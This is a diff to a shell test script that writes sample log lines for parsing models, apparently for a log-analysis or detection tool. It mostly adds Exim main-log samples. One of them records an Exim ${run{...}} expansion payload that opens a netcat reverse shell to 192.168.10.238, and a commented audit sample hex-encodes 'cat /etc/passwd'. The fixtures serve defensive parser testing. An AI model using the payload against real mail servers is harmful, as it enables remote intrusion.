@@ -341,44 +341,55 @@ EOL
 #            echo "audispd: queue is full - dropping event" >> $LOG_FILE
 #            echo "audispd: type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOG_FILE
 #            ;;
-        CronParsingModel)
-            echo "CRON[25537]: (root) CMD ping 8.8.8.8" > $LOG_FILE
-            echo "CRON[25537]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
-            echo "cron[25537]: (*system*mailman) RELOAD (/var/spool/cron/mailman)" >> $LOG_FILE
-            echo "CRON[12461]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)" >> $LOG_FILE
-            echo "CRON[12460]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
-            echo "CRON[13229]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)" >> $LOG_FILE
-            echo "CRON[14368]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)" >> $LOG_FILE
-            ;;
+#        CronParsingModel)
+#            echo "CRON[25537]: (root) CMD ping 8.8.8.8" > $LOG_FILE
+#            echo "CRON[25537]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
+#            echo "cron[25537]: (*system*mailman) RELOAD (/var/spool/cron/mailman)" >> $LOG_FILE
+#            echo "CRON[12461]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)" >> $LOG_FILE
+#            echo "CRON[12460]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
+#            echo "CRON[13229]: (root) CMD ([ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi)" >> $LOG_FILE
+#            echo "CRON[14368]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)" >> $LOG_FILE
+#            ;;
         EximGenericParsingModel)
-            exit $exit_code
-            echo "test12" > $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
+            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
+            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
+            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
+            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
+            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
+            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
+            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
+            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
+            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
+            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
+            # following examples are covering exim failure message types. The examples are taken from
+            # https://forums.cpanel.net/resources/reading-and-understanding-the-exim-main_log.383/
+            echo "2014-09-29 21:27:08 1XYdJu-002e6P-9F SMTP error from remote mail server after MAIL FROM:<someone@someaddress.com> SIZE=6601: host mta5.am0.yahoodns.net [66.196.118.240]: 421 4.7.0 [GL01] Message from (184.171.253.133) temporarily deferred - 4.16.50. Please refer to http://postmaster.yahoo.com/errors/postmaster-21.html" >> $LOG_FILE
+            echo "2020-04-28 22:08:03 1m1x23-2011cZ-MN H=mta7.am0.yahoodns.net [67.195.228.106]: SMTP error from remote mail server after pipelined MAIL FROM:<SENDER@senderdomain.com> SIZE=1758: 421 4.7.0 [TSS04] Messages from 184.171.253.133 temporarily deferred due to unexpected volume or user complaints - 4.16.55.1; see https://postmaster.verizonmedia.com/error-codes" >> $LOG_FILE
+            echo "2014-09-12 08:01:12 1XSLn4-003Fa1-OX SMTP error from remote mail server after end of data: host gmail-smtp-in.l.google.com [173.194.66.27]: 421-4.7.0 [77.69.28.195 15] Our system has detected an unusual rate of\n421-4.7.0 unsolicited mail originating from your IP address. To protect our\n421-4.7.0 users from spam, mail sent from your IP address has been temporarily\n421-4.7.0 rate limited. Please visit\n421-4.7.0 http://www.google.com/mail/help/bulk_mail.html to review our Bulk\n421 4.7.0 Email Senders Guidelines. q4si1448293wij.85 - gsmtp" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
+#            echo "" >> $LOG_FILE
             ;;
         KernelMsgParsingModel)
+            exit $exit_code
             echo "test13" > $LOG_FILE
             ;;
         NtpParsingModel)
